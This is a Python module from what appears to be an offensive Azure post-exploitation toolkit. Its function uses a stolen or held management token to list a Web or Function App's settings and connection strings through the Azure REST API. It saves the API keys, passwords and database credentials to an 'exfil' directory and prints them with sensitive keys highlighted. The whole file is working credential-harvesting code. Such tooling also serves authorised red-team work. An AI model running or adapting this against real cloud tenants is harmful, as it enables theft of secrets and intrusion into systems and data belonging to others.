# src/clouds/azure/modules/exfiltration/exfiltrate_app_settings.py

import json
import requests
from datetime import datetime
from rich.console import Console
from rich.table import Table
from rich.prompt import Prompt, Confirm

from ...azure_session import AzureSessionManager

console = Console()


def exfiltrate_app_settings(session_mgr: AzureSessionManager, app_name: str = None, resource_group: str = None) -> dict:
    """
    Exfiltrate application settings from Azure Functions or Web Apps.

    Extracts connection strings, API keys, database credentials, and all
    environment variables from app configuration.

    Uses Azure Management REST API:
    POST /sites/{name}/config/appsettings/list

    Args:
        session_mgr: Azure session manager
        app_name: Optional app name (prompts if not provided)
        resource_group: Optional resource group (auto-detected if not provided)

    Returns:
        Dictionary with app settings
    """

    # Get subscription ID
    subscription_id = session_mgr.current_session_data.get("subscription_id")
    if not subscription_id:
        console.print("[red]No subscription configured. Use a login command first.[/red]")
        return {}

    # Get management token
    token = session_mgr.get_access_token(scope="management")
    if not token:
        console.print("[red]Management authentication required. Use a login command first.[/red]")
        return {}

    # Get app name
    if not app_name:
        app_name = Prompt.ask("[cyan]Function App or Web App name[/cyan]").strip()

    if not app_name:
        console.print("[red]App name is required.[/red]")
        return {}

    console.print(f"[cyan]Exfiltrating app settings from: {app_name}[/cyan]")

    # If resource group not provided, try to find the app
    if not resource_group:
        console.print("[dim]Finding resource group for app...[/dim]")

        # List all web apps to find resource group
        list_url = f"https://management.azure.com/subscriptions/{subscription_id}/providers/Microsoft.Web/sites?api-version=2022-03-01"
        headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json"
        }

        try:
            response = requests.get(list_url, headers=headers, timeout=30)
            response.raise_for_status()
            apps = response.json().get("value", [])

            for app in apps:
                if app.get("name") == app_name:
                    # Extract resource group from app ID
                    app_id = app.get("id", "")
                    resource_group = app_id.split("/")[4] if len(app_id.split("/")) > 4 else None
                    console.print(f"[dim]Found in resource group: {resource_group}[/dim]")
                    break

            if not resource_group:
                console.print(f"[red]App '{app_name}' not found in subscription.[/red]")
                return {}

        except Exception as e:
            console.print(f"[red]Error finding app: {e}[/red]")
            return {}

    # Call the listConfigurations endpoint (POST)
    settings_url = f"https://management.azure.com/subscriptions/{subscription_id}/resourceGroups/{resource_group}/providers/Microsoft.Web/sites/{app_name}/config/appsettings/list?api-version=2022-03-01"

    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    try:
        console.print("[dim]Calling config/appsettings/list endpoint...[/dim]")
        response = requests.post(settings_url, headers=headers, json={}, timeout=30)
        response.raise_for_status()

        settings_data = response.json()

    except requests.exceptions.RequestException as e:
        console.print(f"[red]Error calling Azure API: {e}[/red]")
        if hasattr(e, 'response') and e.response is not None:
            console.print(f"[dim]Response: {e.response.text[:500]}[/dim]")
        return {}
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
        return {}

    # Extract settings from response
    properties = settings_data.get("properties", {})

    if not properties:
        console.print("[yellow]No application settings found.[/yellow]")
        return {}

    console.print(f"[green]Successfully extracted {len(properties)} setting(s).[/green]")

    # Also get connection strings
    connection_strings = {}
    try:
        conn_url = f"https://management.azure.com/subscriptions/{subscription_id}/resourceGroups/{resource_group}/providers/Microsoft.Web/sites/{app_name}/config/connectionstrings/list?api-version=2022-03-01"
        conn_response = requests.post(conn_url, headers=headers, json={}, timeout=30)
        if conn_response.status_code == 200:
            conn_data = conn_response.json()
            connection_strings = conn_data.get("properties", {})
            if connection_strings:
                console.print(f"[green]Also extracted {len(connection_strings)} connection string(s).[/green]")
    except Exception:
        # Connection strings are optional, don't fail if they're not accessible
        pass

    # Save exfiltration data
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    exfil_dir = session_mgr.get_exfil_dir("app_settings")
    out_file = exfil_dir / f"{app_name}_{timestamp}.json"

    exfil_data = {
        "app_name": app_name,
        "resource_group": resource_group,
        "subscription_id": subscription_id,
        "timestamp": timestamp,
        "app_settings": properties,
        "connection_strings": connection_strings
    }

    out_file.write_text(json.dumps(exfil_data, indent=2))
    console.print(f"[green]Saved to: {out_file}[/green]")

    # Also save to session enumeration data
    session_mgr.save_enumeration_data(f"app_settings_{app_name}", exfil_data)

    # Display results
    console.print("\n[bold cyan]Application Settings:[/bold cyan]\n")

    table = Table(title=f"App Settings for {app_name}")
    table.add_column("Key", style="cyan", overflow="fold")
    table.add_column("Value", style="yellow", overflow="fold")

    # Highlight sensitive keys
    sensitive_keywords = ["password", "pwd", "secret", "key", "token", "connection", "credential"]

    for key, value in properties.items():
        # Check if key contains sensitive keywords
        is_sensitive = any(keyword in key.lower() for keyword in sensitive_keywords)
        key_display = f"[red bold]{key}[/red bold]" if is_sensitive else key

        # Truncate very long values
        value_str = str(value)
        if len(value_str) > 100:
            value_display = value_str[:100] + "..."
        else:
            value_display = value_str

        table.add_row(key_display, value_display)

    console.print(table)

    # Display connection strings if any
    if connection_strings:
        console.print("\n[bold cyan]Connection Strings:[/bold cyan]\n")

        conn_table = Table(title=f"Connection Strings for {app_name}")
        conn_table.add_column("Name", style="cyan", overflow="fold")
        conn_table.add_column("Type", style="magenta")
        conn_table.add_column("Value", style="yellow", overflow="fold")

        for name, details in connection_strings.items():
            conn_type = details.get("type", "Unknown") if isinstance(details, dict) else "Unknown"
            conn_value = details.get("value", str(details)) if isinstance(details, dict) else str(details)

            # Truncate long connection strings
            if len(conn_value) > 100:
                conn_value = conn_value[:100] + "..."

            conn_table.add_row(name, conn_type, conn_value)

        console.print(conn_table)

    console.print(f"\n[dim]Saved as 'app_settings_{app_name}' in this session's enumeration data.[/dim]")

    return exfil_data
